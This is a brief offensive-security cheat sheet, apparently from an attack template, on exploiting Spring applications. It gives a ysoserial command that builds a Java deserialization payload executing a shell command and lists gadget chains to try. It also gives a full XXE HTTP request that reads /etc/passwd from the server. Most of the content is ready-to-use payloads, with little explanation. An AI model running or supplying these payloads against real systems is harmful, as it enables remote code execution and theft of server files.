<deserialization>
<java_deserialization>
{% raw %}
# Java deserialization in Spring:

# Look for:
# - ObjectInputStream usage
# - RMI/JMX endpoints
# - Custom serialization
# - Session storage

# Generate payloads with ysoserial:
java -jar ysoserial.jar CommonsCollections6 'id' | base64

# Common gadget chains:
# - CommonsCollections (if commons-collections in classpath)
# - Spring (if spring-beans in classpath)
# - Hibernate (if hibernate in classpath)
{% endraw %}
</java_deserialization>

<xml_deserialization>
{% raw %}
# XXE in Spring endpoints:

# If XML parsing is enabled:
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
{% endraw %}
</xml_deserialization>
</deserialization>

